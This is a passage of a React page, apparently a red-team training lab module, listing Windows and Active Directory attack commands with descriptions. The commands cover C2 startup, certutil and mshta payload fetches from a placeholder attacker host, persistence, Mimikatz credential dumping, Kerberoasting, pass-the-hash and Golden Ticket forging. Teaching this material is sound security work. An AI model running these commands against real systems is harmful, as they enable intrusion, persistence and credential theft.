            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(320px, 1fr))', gap: '8px' }}>
              {[
                ['sliver-server', 'Start Sliver C2 server'],
                ['sliver-client', 'Connect Sliver operator client'],
                ['certutil -urlcache -split -f http://attacker/payload.exe', 'LOLBin file download via certutil'],
                ['wmic /node:target process call create "powershell -enc BASE64"', 'WMI remote code execution'],
                ['reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Update /t REG_SZ /d C:\\payload.exe', 'Registry run key persistence'],
                ['schtasks /create /tn Update /tr C:\\payload.exe /sc onlogon', 'Scheduled task persistence'],
                ['powershell -nop -exec bypass -w hidden -enc BASE64PAYLOAD', 'PowerShell encoded command'],
                ['mshta.exe javascript:a=(GetObject("script:http://attacker/evil.sct")).Exec();close();', 'MSHTA LOLBin execution'],
                ['Invoke-Mimikatz -Command sekurlsa::logonpasswords', 'Dump creds via PowerShell'],
                ['Invoke-BloodHound -CollectionMethod All', 'BloodHound PowerShell collection'],
                ['Rubeus.exe kerberoast /outfile:hashes.txt', '.NET Kerberoasting'],
                ['SharpHound.exe -c All --zipfilename loot.zip', 'SharpHound AD collection'],
                ['impacket-psexec DOMAIN/user@target -hashes :NTLM_HASH', 'Pass-the-Hash via psexec'],
                ['mimikatz kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /krbtgt:HASH /ptt', 'Forge Golden Ticket'],
                ['Rubeus.exe ptt /ticket:BASE64TICKET', 'Inject Kerberos ticket'],
                ['gophish', 'Start GoPhish phishing framework'],
              ].map(([cmd, desc]) => (
                <div key={cmd} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 8px', background: '#060101', borderRadius: '4px' }}>
                  <code style={{ color: accent, fontSize: '0.72rem', flexShrink: 0 }}>{cmd}</code>
                  <span style={{ color: '#8a4a4a', fontSize: '0.7rem' }}>{desc}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Footer nav */}
      <div style={{ paddingTop: '2rem', borderTop: '1px solid #1a0505', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
        <Link href="/modules/red-team" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a1515' }}>&#8592; BACK TO CONCEPT</Link>
        <Link href="/modules/wireless-attacks/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a1515' }}>MOD-12 WIRELESS ATTACKS LAB &#8594;</Link>
      </div>
    </div>
  )
}
